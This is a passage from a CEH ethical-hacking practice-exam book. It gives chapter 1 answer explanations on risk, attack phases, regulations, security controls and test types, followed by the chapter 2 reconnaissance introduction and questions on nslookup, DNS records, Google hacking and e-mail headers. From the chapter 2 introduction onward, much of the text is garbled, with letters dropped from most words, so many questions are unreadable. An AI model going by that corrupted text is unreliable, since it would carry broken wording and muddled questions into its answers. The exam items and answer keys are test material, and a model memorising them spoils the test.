engineering should help reduce the likelihood an employee will fall victim (real-life
concerns on this notwithstanding—we are talking about test questions here).

☐✗ A is incorrect because the acceptance of risk means the organization understands the
risk is there, but they don’t do anything about it. Why would a company take this
action? Perhaps the chance a threat agent will (or even can) exploit the risk is so low it
makes the effort to mitigate it pointless. Or it could be the cost to mitigate simply is
more than any damage or recovery from exploitation in the first place. In any case, if
the organization does nothing, they’re accepting risk.

☐✗ B is incorrect because avoidance of risk means the organization takes steps to
eliminate the service, action, or technology altogether. In other words, the risk is
deemed so great the company would rather do without the asset or service in the first
place. In the case of social engineering, unless the organization can work without
employees, avoiding this risk is nearly impossible.

☐✗ D is incorrect because transferring risk occurs when the organization puts the burden
of risk on another party. For example, the company might hire an insurance company
to pay off in the event a risk is exploited.

14. In which phase of the ethical hacking methodology would a hacker be expected to discover
available targets on a network?

A. Reconnaissance

B. Scanning and enumeration

C. Gaining access

D. Maintaining access

E. Covering tracks

CEH Certified Ethical Hacker Practice Exams

18

01-ch01.indd 18 30/03/22 2:41 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 1

☑ B. The scanning and enumeration phase is where you’ll use things such as
ping sweeps to discover available targets on the network. This step occurs after
reconnaissance. In this step, tools and techniques are actively applied to information
gathered during recon to obtain more in-depth information on the targets. For
example, reconnaissance may show a network subnet to have 500 or so machines
connected inside a single building, whereas scanning and enumeration would
discover which ones are Windows machines and which ones are running FTP. As an
aside, it’s important to remember these phases and definitions are exactly what you’ll
need to pass your exam, but in the real world, actions and findings don’t necessarily
fit cleanly into predefined roles and definitions.

☐✗ A is incorrect because the reconnaissance phase is nothing more than the steps taken
to gather evidence and information on the targets you want to attack. Activities
that occur in this phase include dumpster diving and social engineering. Another
valuable tool in recon is the Internet. Look for any of these items as key words in
answers on your exam. Of course, in the real world, you may actually gather so much
information in your recon you’ll already be way ahead of the game in identifying
targets and whatnot, but when it comes to the exam, stick with the hard-and-fast
boundaries they want you to remember and move on.

☐✗ C is incorrect because the gaining access phase is all about attacking the machines
themselves. You’ve already figured out background information on the client and
have enumerated the potential vulnerabilities and security flaws on each target. In
this phase, you break out the big guns and start firing away. Key words you’re looking
for here are the attacks themselves: accessing an open and unsecured wireless access
point, manipulating network devices, writing and delivering a buffer overflow, and
performing SQL injection against a web application are all examples.

☐✗ D is incorrect because this phase is all about backdoors and the steps taken to ensure
you have a way back in. For the savvy readers out there who noticed I skipped a
step here (escalating privileges), well done. Key words you’ll look for on this phase
(maintaining access) are backdoors, zombies, and rootkits.

☐✗ E is incorrect because this phase is all about cleaning up when you’re done and
making sure no one can see where you’ve been. Clearing tracks involves steps to
conceal success and avoid detection by security professionals. Steps taken here consist
of removing or altering log files, concealing files via hidden attributes or directories,
and even using tunneling protocols to communicate with the system.

15. Which of the following was created to protect shareholders and the general public from
corporate accounting errors and fraudulent practices as well as to improve the accuracy of
corporate disclosures?

A. GLBA

B. HIPAA

C. SOX

D. FITARA

Chapter 1: Getting Started: Essential Knowledge

19

01-ch01.indd 19 30/03/22 2:41 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 1

☑ C. The Sarbanes-Oxley Act (SOX; https://www.sec.gov/about/laws.shtml#sox2002)
introduced major changes to the regulation of financial practice and corporate
governance in 2002 and is arranged into 11 titles. SOX mandated a number of
reforms to enhance corporate responsibility, enhance financial disclosures, and
combat corporate and accounting fraud, and it created the “Public Company
Accounting Oversight Board,” also known as the PCAOB, to oversee the activities of
the auditing profession.

☐✗ A is incorrect because the Gramm-Leach-Bliley Act (GLBA; https://www.ftc.gov/
tips-advice/business-center/privacy-and-security/gramm-leach-bliley-act) requires
financial institutions—companies that offer consumers financial products or
services such as loans, financial or investment advice, or insurance—to explain
their information-sharing practices to their customers and to safeguard sensitive
data. Under the Safeguards Rule, financial institutions must protect the consumer
information they collect. GLBA protects the confidentiality and integrity of personal
information collected by financial institutions.

☐✗ B is incorrect because the Health Insurance Portability and Accountability Act
(HIPAA; www.hhs.gov/hipaa/) was designed to protect the confidentiality of private
health information. HIPAA contains privacy and security requirements as well as
provides steps and procedures for handling and protecting private health data.

☐✗ D is incorrect because the Federal Information Technology Acquisition Reform Act
(FITARA; https://www.congress.gov/bill/113th-congress/house-bill/1232) didn’t
actually pass in full, but did contain sections that were eventually added as part of the
National Defense Authorization Act (NDAA) for fiscal year 2015.

16. Which of the following best defines a logical or technical control?

A. Air conditioning

B. Security tokens

C. Fire alarms

D. Security policy

☑ B. A logical (or technical) control is one used for identification, authentication,
and authorization. It can be embedded inside an operating system, application,
or database management system. A security token (such as RSA’s SecureID) can
provide a number that changes on a recurring basis that a user must provide during
authentication, or it may provide a built-in number on a USB device that must be
attached during authentication. A physical control is something, well, physical in
nature, such as a lock or key or maybe a guard.

☐✗ A and C are incorrect because air conditioning and fire alarms both fall into the
category of physical control.

☐✗ D is incorrect because a security policy isn’t a logical or technical control.

CEH Certified Ethical Hacker Practice Exams

20

01-ch01.indd 20 30/03/22 2:41 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 1

17. Which of the following was created to protect credit card data at rest and in transit in an
effort to reduce fraud?

A. TCSEC

B. Common Criteria

C. ISO 27002

D. PCI DSS

☑ D. The Payment Card Industry Data Security Standard (PCI DSS) is a security
standard for organizations that handle credit cards. A council including American
Express, JCB, Discover, MasterCard, and Visa developed standards for the protection
and transmission of card data to reduce credit card fraud. It’s administered by the
Payment Card Industry Security Standards Council. Validation of compliance is
performed annually. The standard is composed of 12 requirements:

• Requirement 1: Install and maintain firewall configuration to protect data.

• Requirement 2: Remove vendor-supplied default passwords and other default
security features.

• Requirement 3: Protect stored data.

• Requirement 4: Encrypt transmission of cardholder data.

• Requirement 5: Install, use, and update AV (antivirus).

• Requirement 6: Develop secure systems and applications.

• Requirement 7: Use “need to know” as a guideline to restrict access to data.

• Requirement 8: Assign a unique ID to each stakeholder in the process (with
computer access).

• Requirement 9: Restrict any physical access to the data.

• Requirement 10: Monitor all access to data and network resources holding,
transmitting, or protecting it.

• Requirement 11: Test security procedures and systems regularly.

• Requirement 12: Create and maintain an information security policy.

☐✗ A is incorrect because the Trusted Computer System Evaluation Criteria (TCSEC),
also known as the Orange Book, was created by the Department of Defense (DoD)
and defines and provides guidance on evaluating access controls within a system.
TCSEC defines four levels of validation: verified protection, mandatory protection,
discretionary protection, and minimal protection.

☐✗ B is incorrect because Common Criteria (www.commoncriteriaportal.org/) is an
international standard to test and evaluate IT products. Per the website, CC is a
“framework in which computer system users can specify their security requirements
through the use of Protection Profiles (PPs), vendors can then implement and/or
make claims about the security attributes of their products, and testing laboratories

Chapter 1: Getting Started: Essential Knowledge

21

01-ch01.indd 21 30/03/22 2:41 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 1

can evaluate the products to determine if they actually meet the claims. In other
words, Common Criteria provides assurance that the process of specification,
implementation and evaluation of a computer security product has been conducted
in a rigorous and standard and repeatable manner at a level that is commensurate
with the target environment for use.”

☐✗ C is incorrect because ISO 27002 (www.iso27001security.com/html/27002.html) is an
“information security standard published by ISO and the International Electrotechnical
Commission (IEC) that recommends security controls based on industry best practices.”
This standard includes 13 objectives, ranging from structure, risk assessment, and policy
to access controls, human resources security, and compliance.

18. As part of the preparation phase for a pen test you are participating in, the client relays
their intent to discover security flaws and possible remediation. They seem particularly
concerned about internal threats from the user base. Which of the following best describes
the test type the client is looking for?

A. Gray box

B. Black box

C. White hat

D. Black hat

☑ A. Once again, this is a play on words the exam will throw at you. Note the question
is asking about a test type, not the attacker. Reviewing CEH documentation, you’ll
see there are three types of tests—white, black, and gray—with each designed to
test a specific threat. White tests the internal threat of a knowledgeable systems
administrator or an otherwise elevated privilege level user. Black tests external threats
with no knowledge of the target. Gray tests the average internal user threat to expose
potential security problems inside the network.

☐✗ B is incorrect because black-box testing is designed to simulate the external threat.
Black-box testing takes the most amount of time to complete because it means a
thorough romp through the five stages of an attack (and removes any preconceived
notions of what to look for) and is usually the most expensive option. Another
drawback to this type of test is that it focuses solely on the threat outside the
organization and does not take into account any trusted users on the inside.

☐✗ C is incorrect because a hat color refers to the attacker. True, the client is hiring a
white hat in this instance to perform the test; however, the hat does not equate to
the test. White hats are the “good guys”—ethical hackers hired by a customer for the
specific goal of testing and improving security. White hats don’t use their knowledge
and skills without prior consent.

☐✗ D is incorrect because this question refers to the test itself, not the type of attacker.
Black hats are the “bad guys” and are otherwise known as crackers. They illegally use
their skills either for personal gain or for malicious intent, seeking to steal or destroy
data or to deny access to resources and systems. Black hats do not ask for permission
or consent.

CEH Certified Ethical Hacker Practice Exams

22

01-ch01.indd 22 30/03/22 2:41 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 1

19. In which phase of the attack would a hacker set up and configure “zombie” machines?

A. Reconnaissance

B. Covering tracks

C. Gaining access

D. Maintaining access

☑ D. Zombies are basically machines hackers commandeer to do their work for them.
If the attacker is really good, the owners of the zombie machines don’t even know
their machines have been drafted into the war. There are a bajillion methods for
maintaining access on a machine you’ve already compromised, and maintaining
that access does not necessarily mean the system will be used as a zombie—you
could, for example, simply want to check in from time to time to see what new juicy
information the user has decided to leave in a file or folder for you, or to check on
new logins, credentials, and so on. However, configuring zombie systems definitely
belongs in this phase.

☐✗ A is incorrect because the reconnaissance phase is all about gaining knowledge and
information on a target. In reconnaissance, you’re learning about the target itself—for
example, what system types they may have in use, what their operating hours are,
whether they use a shredder, and what personal information about their employees is
available. Think of reconnaissance as the background information on a good character
in a novel; it may not be completely necessary to know before you read the action
scenes, but it sure makes it easier to understand why the character behaves in a certain
manner during the conflict phase of the book. Setting up zombie systems goes far
beyond the boundaries of gathering information.

B is incorrect because this phase is where attackers attempt to conceal their success
and avoid detection by security professionals. This can involve removing or altering
log files, concealing files with via hidden attributes or directories, and using tunneling
protocols to communicate with the system.

☐✗ C is incorrect because in this phase attacks are leveled against the targets identified
during the scanning and enumeration phase. Key words to look for in identifying
this phase are the attacks themselves (such as buffer overflow and SQL injection).
Finally, be careful about questions relating to elevating privileges. Sometimes this
is counted as its own phase, so pay close attention to the question’s wording in
choosing your answer.

20. Which of the following should not be included in a security policy?

A. Policy exceptions

B. Details on noncompliance disciplinary actions

C. Technical details and procedures

D. Supporting document references

Chapter 1: Getting Started: Essential Knowledge

23

01-ch01.indd 23 30/03/22 2:41 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 1

☑ C. The whole policy/standard/procedure/guideline thing can get confusing sometimes.
A policy is a high-level document that doesn’t get down and dirty into technical
details/specifications and is intended to improve awareness. Policies are mandatory,
generally short, and easy to understand, providing everyone with the rules of the road.
Standards are mandatory rules designed to support a policy, and they must include
one or more specifications for hardware, software, or behavior. Procedures are step-
by-step instructions for completing a task. Guidelines are not mandatory but rather
are recommendations for accomplishing a goal or on how to act in a given situation.

☐✗ A, B, and D are incorrect because all these are perfectly acceptable security policy
entries. Exceptions to the policy and what happens to you should you decide not to
follow the policy are expected entries. Also, supporting documents—such as various
procedures, standards, and guidelines—are always referenced in the policy.

21. Which of the following is best defined as a set of processes used to identify, analyze,
prioritize, and resolve security incidents?

A. Incident management

B. Vulnerability management

C. Change management

D. Patch management

☑ A. Admittedly, this one is fairly easy—or at least it should be. Incident management
is the process of dealing with incidents and generally always has the same features/
steps—identify the problem or root cause, analyze and research the issue, contain
the malicious effort, eradicate the effort, and resolve any damage caused. ECC
defines the process as having eight steps: 1. Preparation, 2. Detection and Analysis,
3. Classification/Prioritization, 4. Notification, 5. Containment, 6. Forensic
Investigation, 7. Eradication and Recovery, and 8. Post-incident Activities. The
incident response team (IRT) is charged with handling this process.

☐✗ B is incorrect because vulnerability management isn’t about responding to incidents;
it’s about identifying and eradicating vulnerabilities before an incident can occur.

☐✗ C is incorrect because change management involves implementing procedures or
technologies to identify and implement required changes within a computer system.

☐✗ D is incorrect because patch management is designed to manage the identification,
installations, and tracking of security patches necessary within the environment.

22. During an assessment, your pen test team discovers child porn on a system. Which of the
following is the appropriate response?

A. Continue testing and report findings at the out-brief.

B. Continue testing but report findings to the business owners.

C. Cease testing immediately and refuse to continue work for the client.

D. Cease testing immediately and contact authorities.

CEH Certified Ethical Hacker Practice Exams

24

01-ch01.indd 24 30/03/22 2:41 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 1

☑ D. I hesitated to add this question, for reasons that are obvious and some that aren’t,
but in the interest of covering everything, I felt I must. First and foremost, in the real
world, discovery of something that you think might be illegal activity puts you and
your team in a very, very tricky spot. Should you accuse fill-in-the-blank of a crime
and involve the authorities, you could be setting yourself up for lawsuits and all sorts
of trouble. On the other hand, if you ignore it, you might be found complicit, or
at the very least negligent. In the real world, the answer is to make sure your scope
agreement advises you and the client of your duty regarding potential criminal
activity found during the scope of your investigation. No guessing is allowed—it
better be iron-clad evidence, obvious to all, or you’re in a world of hurt. Finally, what
potentially illegal activity you discover may determine your response regardless of the
ROE (rules of engagement). If you discover child porn, you could be guilty of a crime
for not reporting it, which isn’t necessarily true for many other crimes. For example,
if you witness someone breaking into a house across your street, or were performing
a pen test and reasonably suspected someone had already compromised the network,
you are not compelled by law, in most states, to notify authorities. However, if you
witness bodily harm, you likely would be compelled by law in most states. Speaking
purely academically, it’s fairly clear cut and will be so on your exam. In the real world,
the true answer is to know the laws regarding your testing very well, and make sure
your team has a good lawyer.

In this example, however, the choices present make this relatively easy. ECC wants
ethical hackers to report any illegal activity they find. Period. Possession of child
porn is a crime no matter what, so again in this particular case, stop your testing and
report it to the authorities.

☐✗ A and B are incorrect because regardless of reporting, you should immediately stop
testing. Anything you do after discovery not only could destroy evidence but actually
put you at risk. Who’s to say you didn’t put the item in question on the system, or
by your action cause it to be there? Rest assured the defense attorney will posit that
argument, should it come to that.

☐✗ C is incorrect because you’ve already agreed to perform this work, and refusing to
speak with the client isn’t helping anything at all. Again, this needs to be addressed
in the scope agreement up front, so there should be no surprises. It may well be that
an employee has illegal stuff on their system, but that doesn’t necessarily mean the
organization is complicit.

23. Which of the following best describes an intranet zone?

A. A zone with few heavy security restrictions

B. A highly secured zone, usually employing VLANs and encrypted communication
channels

C. A controlled buffer network between public and private networks

D. A very restricted zone with no users

Chapter 1: Getting Started: Essential Knowledge

25

01-ch01.indd 25 30/03/22 2:41 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 1

☑ A. An intranet can be thought of, for testing purposes, as your own happy little
networking safe space. It’s protected from outside attacks and interference by the
DMZ and all the layers of security on the outside. Internally, you don’t assign loads
of heavy security restrictions, because, as explained in the security versus usability
discussion in the CEH All-in-One Exam Guide, Fifth Edition, as security increases,
usability and functionality decrease. If your organization’s users are on the intranet,
you want them as productive as possible, right?

☐✗ B is incorrect because this describes the management network zone. This zone is
usually cordoned off specifically for infrastructure and management traffic. For
obvious reasons, it’s highly secured. Look for “VLAN” and “IPSec” as keywords for
this zone.

☐✗ C is incorrect because this describes the DMZ. The demilitarized zone in military
parlance refers to a section of land between two adversarial parties where there are no
weapons and no fighting. The idea is you could see an adversary coming across and
have time to work up a defense. In networking, the idea is the same: it’s a controlled
buffer network between you and the uncontrolled chaos of the Internet. And keep in
mind DMZs aren’t just between the Internet and a network; they can be anywhere an
organization decides they want or need a buffer—inside or outside various internets
and intranets. DMZ networks provide great opportunity for good security measures
but can also sometimes become an Achilles’ heel when too much trust is put into
their creation and maintenance.

☐✗ D is incorrect because this describes the production network zone (PNZ). The PNZ is
a very restricted zone that strictly controls direct access from uncontrolled zones. The
PNZ supports functions and actions that must have strict access control. As an aside,
the PNZ is not designed to hold users.

24. A machine in your environment uses an open X-server to allow remote access. The
X-server access control is disabled, allowing connections from almost anywhere and with
little to no authentication measures. Which of the following are true statements regarding
this situation? (Choose all that apply.)

A. An external vulnerability can take advantage of the misconfigured X-server threat.

B. An external threat can take advantage of the misconfigured X-server vulnerability.

C. An internal vulnerability can take advantage of the misconfigured X-server threat.

D. An internal threat can take advantage of the misconfigured X-server vulnerability.

☑ B, D. This is an easy one because all you have to understand are the definitions of
threat and vulnerability. A threat is any agent, circumstance, or situation that could
potentiality cause harm or loss to an IT asset. In this case, the implication is the
threat is an individual (hacker) either inside or outside the network. A vulnerability
is any weakness, such as a software flaw or logic design, that could be exploited by
a threat to cause damage to an asset. In both these answers, the vulnerability—the
access controls on the X-server are not in place—can be exploited by the threat,
whether internal or external.

CEH Certified Ethical Hacker Practice Exams

26

01-ch01.indd 26 30/03/22 2:41 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 1

☐✗ A and C are both incorrect because they list the terms backward. Threats take
advantage of vulnerabilities and exploit them, not the other way around.

25. Which of the following best describes forensic evidence indicating a potential intrusion
or malicious activity?

A. TTP

B. IOC

C. APT

D. ABI

☑ B. An indicator of compromise (IOC) describes the little clues and artifacts left
behind on a resource that can indicate malicious intrusion or activity. Their existence
in and of themselves might not mean anything; however, searching for known IOCs
in your network can be a valuable security exercise to undertake. IOCs can come in
many forms, some of which include privileged user activity anomalies, strange DNS
requests, conflicting port application traffic, unusual registry or system file changes,
and suspect web traffic and unusual network activity.

☐✗ A is incorrect because TTP refers to tactics, techniques, and procedures, which are
the patterns of activity and methods associated with specific adversaries.

☐✗ C is incorrect because APT refers to advanced persistent threat—a threat actor who
gains unauthorized access to a resource and remains undetected for an extended period.

☐✗ D is incorrect because ABI refers to adversary behavioral identification, which involves
efforts in identifying the common methods and techniques followed by adversaries.

Chapter 1: Getting Started: Essential Knowledge

27

01-ch01.indd 27 30/03/22 2:41 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 1/ Blind Folio: 28

This page intentionally left blank

01-ch01.indd 28 30/03/22 2:41 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 2

CHAPTER

Reconnaissance: 2
Information Gathering for
the Ethical Hacker
This chapter includes questions from the following topics:

• Define active and passive footprinting
• Identify methods and procedures in information gathering
• Understand the use of social networking, search engines, and Google hacking in

information gathering
• Understand the use of whois, ARIN, and nslookup in information gathering
• Describe DNS record types

Cimiology (h sudy of h au, causs, cool, ad pvio of cimial bhavio) is a
fasciaig subjc, ad alhough w’ cocaig o h viual wold i his book, i’s amaz-
ig how much foopiig is do i h physical cimial wold as wll. Mos of us hav alady
had a millio ims h sadad higs w’ supposd o do o mak ou homs lss dsiabl as
a ag fo h bad guys. Thigs such as kpig h hous wll li, usig ims o lighs ad TVs
o mak h hous appa “livd i” all h im, ad isallig a good alam sysm a so com-
mo i hs discussios ha w d o od off i bodom wh a scuiy xp sas alkig
abou hm. Bu did you kow mos commo buglas pf o wok duig h dayim, wh
i’s mos likly you’ o a hom a all (a las, bfo w all sad wokig a hom bcaus of
a padmic). Did you kow mos do’ giv a ip abou you alam sysm bcaus hy pla o
big isid fo igh o  mius o lss? Ad did you fuh kow ha mos im sysms
fo lighs do’ chag a hig i h bugla’s mid bcaus h’s usually sound associad wih
popl big hom?

Fo h sak of xampl, ak a imagiay id wih m aoud my subdivisio, ad w’ll
y hikig lik a cimial foopiig a ighbohood fo ags. Mayb w’ll sa by jus
divig aoud h ighbohood o ascai who h osy ighbos a ad wha houss mak
h mos pomisig oppouiis. This hous o ou igh is i a cul-d-sac ad povids mo
pivacy ad lss polic paol affic ha hos o h mai dag. Oh, wha abou ha hous ov
h? Yah, i looks lik h yad has’ b mowd fo a whil, so mayb hy a’ hom—o
hy jus do’ pay as clos aio o hom dails as h oh homows do. Th ows of

29

02-ch02.indd 29 06/04/22 2:33 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 2

ha wo-soy ov h hav a dog, so w’ll pobably avoid ha o. Bu look jus h: ha
hous has a gia box laig agais h gabag ca fo h bad-w 82-ich QLED TV h
ow jus puchasd. W should pobably wi his addss dow fo a clos look la. Ad
h hous acoss h pod h wih h slidig glass doo? I dfiily has poial.

I could go o ad o h (I ally lik his subjc ad could cha abou i fov), bu his
book is abou h viual wold, ad I’m pppig you o b a hical hack, o a offic
wokig a ba. This chap is also all abou coaissac ad foopiig—i h viual
wold—ad is all abou h mhods ad ools usd o gah ifomaio abou you ags
bfo you v y o aack hm.

STUDY TIPS There will be plenty of questions from this particular segment of
hacking, mainly because it’s so important to gather good intelligence before
starting an attack. Sure, you can sometimes get lucky and strike quickly, but
often, putting in the work during footprinting reaps the biggest rewards.

What will be the biggest area of focus you’ll see on your actual exam? A couple of
versions ago, it was all things DNS, but now it’s much more varied. You are just as likely
to see questions on active versus passive reconnaissance as you are on Google hacking,
OS fingerprinting, and DNS subtleties. EC-Council has definitely broadened the horizons
when it comes to recon and footprinting questions, so, while I hate to say memorize
everything, memorize everything.

Tips on the tricky questions here are the same as you’ll hear me say in every other
chapter—they’re nit-picky, in-the-weeds, specific-knowledge questions designed to
trip you up. Know your e-mail headers and DNS records, of course, but you’ll also see
questions on specific tools and how they act. And by all means start practicing your
Google hacking right now—you’ll definitely need it since most Google hacking questions
will require you to know exact syntax.

CEH Certified Ethical Hacker Practice Exams

30

02-ch02.indd 30 06/04/22 2:33 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 2

QUESTIONS

1. You a ampig o fid ou h opaig sysm ad CPU yp of sysms i you Q
ag ogaizaio. Th DNS sv you wa o us fo lookup is amd ADNS_
Sv, ad h ag machi you wa h ifomaio o is ATARGET_SYSTEM.
Which of h followig slookup commad sis is h bs choic fo discovig his
ifomaio? (Th oupu of h commads is dacd.)

A.
> server ADNS_SERVER
…
> set type=HINFO
> ATARGET_SYSTEM
…

B.
> server ATARGET_SYSTEM
…
> set type=HINFO
> ADNS_SERVER
…

C.
> server ADNS_SERVER

…
> set ATARGET_SYSTEM
> type=HINFO
…

D.
> server type=HINFO

…
> set ADNS_SERVER
> ATARGET_SYSTEM
…

2. A p s am mmb sds a -mail o a addss ha sh kows is o valid isid
a ogaizaio. Which of h followig is h bs xplaaio fo why sh ook his acio?

A. To possibly gah ifomaio abou ial hoss usd i h ogaizaio’s -mail
sysm

B. To sa a dial-of-svic aack

C. To dmi a -mail admiisao’s coac ifomaio

D. To gah ifomaio abou how -mail sysms dal wih ivalidly addssd mssags

3. Fom h paial -mail had povidd, which of h followig pss h u
oigiao of h -mail mssag?
Return-path: <SOMEONE@anybiz.com>
Delivery-date: Tue, 22 Mar 2022 00:31:13 +0200
Received: from mailexchanger.anotherbiz.com([220.15.10.254])
by mailserver.anotherbiz.com running ExIM with esmtp
id xxxxxx-xxxxxx-xxx; Tue, 22 Mar 2022 01:39:23 +0200

Chapter 2: Reconnaissance: Information Gathering for the Ethical Hacker

31

02-ch02.indd 31 06/04/22 2:33 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 2

Received: from mailserver.anybiz.com ([158.190.50.254] helo=mailserver.
anybiz.com)
by mailexchanger.anotherbiz.com with esmtp id xxxxxx-xxxxxx-xx
for USERJOE@anotherbiz.com; Tue, 22 Mar 2022 01:39:23 +0200
Received: from SOMEONEComputer [217.88.53.154] (helo=[SOMEONEcomputer])
by mailserver.anybiz.com with esmtpa (Exim x.xx)
(envelope-from <SOMEONE@anybiz.com) id xxxxx-xxxxxx-xxxx
for USERJOE@anotherbiz.com; Mon, 21 Mar 2022 20:36:08 -0100
Message-ID: <xxxxxxxx.xxxxxxxx@anybiz.com>
Date: Mon, 21 Mar 2022 20:36:01 -0100
X-Mailer: Mail Client
From: SOMEONE Name <SOMEONE@anybiz.com>
To: USERJOE Name <USERJOE@anotherbiz.com>
Subject: Something to consider
...

A. 220.15.10.254

B. 158.190.50.254

C. 217.88.53.154

D. Th -mail had dos o show his ifomaio.

4. You a lookig fo pags wih h ms CEH ad V11 i hi il. Which Googl hack
is h appopia o?

A. iul:CEHiul:V11

B. alliil:CEH V11

C. iil:CEHiul:V11

D. alliul:CEH V11

5. You a o a Cisco ou ad wa o idify h pah a pack avls o a spcific IP.
Which of h followig is h bs commad choic fo his?

A. pig

B. ifcofig

C. ac

D. acou

6. Which of h followig aciviis a not cosidd passiv foopiig? (Choos wo.)

A. Dumps divig

B. Rviwig fiacial sis fo compay ifomaio

C. Clickig liks wihi h compay’s public wbsi

D. Callig h compay’s hlp dsk li

E. Employig passiv siffig

CEH Certified Ethical Hacker Practice Exams

32

02-ch02.indd 32 06/04/22 2:33 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 2

7. Exami h followig commad squc:
C:\> nslookup
Default Server: ns1.anybiz.com
Address: 188.87.99.6
> set type=HINFO
> someserver
Server: resolver.anybiz.com
Address: 188.87.100.5
Someserver.anybiz.com CPU=Intel Quad Chip OS=Linux 2.8

Which of h followig sams bs dscibs h i of h commad squc?

A. Th opao is umaig a sysm amd somsv.

B. Th opao is ampig DNS poisoig.

C. Th opao is ampig a zo asf.

D. Th opao is ampig o fid a am sv.

8. A ogaizaio has a DNS sv locad i h DMZ ad oh DNS svs locad o
h ia. Wha is his implmaio commoly calld?

A. Dyamic DNS

B. DNSSEC

C. Spli DNS

D. Auo DNS

9. You a sig up DNS fo you pis. Sv A is boh a wb sv ad a FTP
sv. You wa o advis boh svics fo his machi as am fcs you
cusoms ca us. Which DNS cod yp would you us o accomplish his?

A. NS

B. SOA

C. MX

D. PTR

E. CNAME

10. A compay has a public-facig wb applicaio. Is ial ia-facig svs a
spaad ad pocd by a fiwall. Which of h followig choics would b hlpful i
pocig agais uwad umaio?

A. Allowig zo asfs o ANY

B. Esuig h a o A cods fo ial hoss o h public-facig am sv

C. Chagig h pfc umb o all MX cods o zo

D. No allowig ay DNS quy o h public-facig am sv

Chapter 2: Reconnaissance: Information Gathering for the Ethical Hacker

33

02-ch02.indd 33 06/04/22 2:33 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 2

11. A hical hack sachs fo IP ags owd by h cli, ads ws aicls, obsvs
wh bak mploys aiv ad lav fom wok, sachs h cli’s job posigs, ad
visis h cli’s dumps. Which of h followig is a u sam?

A. All of h acios a aciv foopiig.

B. All of h acios a passiv foopiig.

C. Th hical hack is i h sysm aack phas.

D. Th hical hack is acig as a black-ha aack.

12. Exami h followig SOA cod:
@ IN SOARTDNSRV1.somebiz.com. postmaster.somebiz.com. (
200408097 ; serial number

3600 ; refresh [1h]
600 ; retry [10m]
86400 ; expire [1d]

7200 ) ; min TTL [2h]

If a scoday sv i h pis is uabl o chck i fo a zo upda wihi a
hou, wha happs o h zo copy o h scoday?

A. Th zo copy is dumpd.

B. Th zo copy is uchagd.

C. Th sial umb of h zo copy is dcmd.

D. Th sial umb of h zo copy is icmd.

13. Which poocol ad po umb combiaio is usd by dfaul fo DNS zo asfs?

A. UDP 53

B. UDP 161

C. TCP 53

D. TCP 22

14. Exami h followig commad-li y:
C:\>nslookup

Default Server: ns1.somewhere.com
Address: 128.189.72.5

> set q=mx
>mailhost

Which sams a u gadig his commad squc? (Choos wo.)

A. Nslookup is i oiaciv mod.

B. Nslookup is i iaciv mod.

C. Th oupu will show all mail svs i h zo somwh.com.

D. Th oupu will show all am svs i h zo somwh.com.

CEH Certified Ethical Hacker Practice Exams

34

02-ch02.indd 34 06/04/22 2:33 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 2

15. Jo accsss h compay wbsi, www.aybusi.com, fom his hom compu ad is
psd wih a dfacd si coaiig disubig imags. H calls h IT dpam
o po h wbsi hack ad is old hy do o s ay poblm wih h si—o fils
hav b chagd, ad wh accssd fom hi mials (isid h compay), h
si appas omal. Jo cocs ov VPN io h compay wbsi ad oics h
si appas omal. Which of h followig migh xplai h issu?

A. DNS poisoig

B. Rou poisoig

C. SQL ijcio

D. ARP poisoig

16. O way o miiga agais DNS poisoig is o sic o limi h amou of im
cods ca say i cach bfo hy’ updad. Which DNS cod yp allows you o
s his sicio?

A. NS

B. PTR

C. MX

D. CNAME

E. SOA

17. Which of h followig may b a scuiy coc fo a ogaizaio?

A. Th ial wok uss piva IP addsss gisd o a Aciv Dicoy–
igad DNS sv.

B. A xal DNS sv is Aciv Dicoy igad.

C. All xal am soluio quss a accomplishd by a ISP.

D. No of h abov.

18. Which of h followig is a good foopiig ool fo discovig ifomaio o a
publicly add compay’s foudig, hisoy, ad fiacial saus?

A. SpidFoo

B. EDGAR Daabas

C. Sam Spad

D. Pipl.com

19. Wha mhod dos acou us o map ous avld by a pack?

A. By cayig a hllo pack i h payload, focig h hos o spod

B. By usig DNS quis a ach hop

C. By maipulaig h im o liv (TTL) paam

D. By usig ICMP Typ 5, Cod 0 packs

Chapter 2: Reconnaissance: Information Gathering for the Ethical Hacker

35

02-ch02.indd 35 06/04/22 2:33 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 2

20. Bad has discovd som PDF fils o a ag’s public-facig wbsi. Which of h
followig ools should h mak us of o xac ay usabl madaa fom hos
docums?

A. Magoofil

B. Shoda

C. Whois

D. Malgo

21. A zo fil cosiss of which cods? (Choos all ha apply.)

A. PTR

B. MX

C. SN

D. SOA

E. DNS

F. A

G. AX

